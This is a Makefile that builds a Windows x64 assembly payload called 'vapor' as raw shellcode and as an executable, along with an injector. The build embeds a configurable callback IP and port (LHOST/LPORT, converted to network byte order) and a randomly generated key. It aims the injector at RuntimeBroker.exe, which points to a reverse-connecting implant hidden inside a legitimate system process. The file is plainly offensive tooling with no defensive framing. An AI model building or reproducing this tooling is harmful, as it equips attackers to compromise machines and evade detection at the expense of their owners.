NASM    = nasm
LD      = x86_64-w64-mingw32-ld
LHOST  ?= 127.0.0.1
LPORT  ?= 443
KEY    ?= $(shell python3 -c "import secrets; print(secrets.token_hex(32))")

# Convert IP so NASM's LE DWORD storage produces network-order bytes
# e.g., 10.10.14.1 -> memory bytes 0a 0a 0e 01
IP_HEX  = $(shell python3 -c "import socket,struct; b=socket.inet_aton('$(LHOST)'); v=struct.unpack('<I',b)[0]; print('0x{:08x}'.format(v))")

# Convert port so NASM's LE WORD storage produces network-order bytes
PORT_HEX = $(shell python3 -c "import struct; v=struct.unpack('<H',struct.pack('!H',$(LPORT)))[0]; print('0x{:04x}'.format(v))")

# Generate key include file with db directives
KEY_INC = key.inc
$(KEY_INC): FORCE
	python3 -c "k=bytes.fromhex('$(KEY)'); print('db '+','.join('0x{:02x}'.format(b) for b in k))" > $@

FORCE:

DEFINES = -DCALLBACK_IP=$(IP_HEX) \
          -DCALLBACK_PORT=$(PORT_HEX)

all: vapor.bin vapor.exe injector.exe

vapor.bin: vapor.asm $(KEY_INC)
	$(NASM) -f bin $(DEFINES) vapor.asm -o $@

vapor.obj: vapor.asm $(KEY_INC)
	$(NASM) -f win64 $(DEFINES) vapor.asm -o $@

vapor.exe: vapor.obj
	$(LD) --entry=_start --subsystem=windows -o $@ $<

TARGET ?= C:\Windows\System32\RuntimeBroker.exe

injector.obj: injector.asm vapor.bin
	$(NASM) -f win64 -DTARGET_PROCESS="'$(TARGET)'" injector.asm -o $@

injector.exe: injector.obj
	$(LD) --entry=_start --subsystem=windows -o $@ $<

clean:
	rm -f vapor.bin vapor.obj vapor.exe injector.obj injector.exe $(KEY_INC)

.PHONY: all clean FORCE
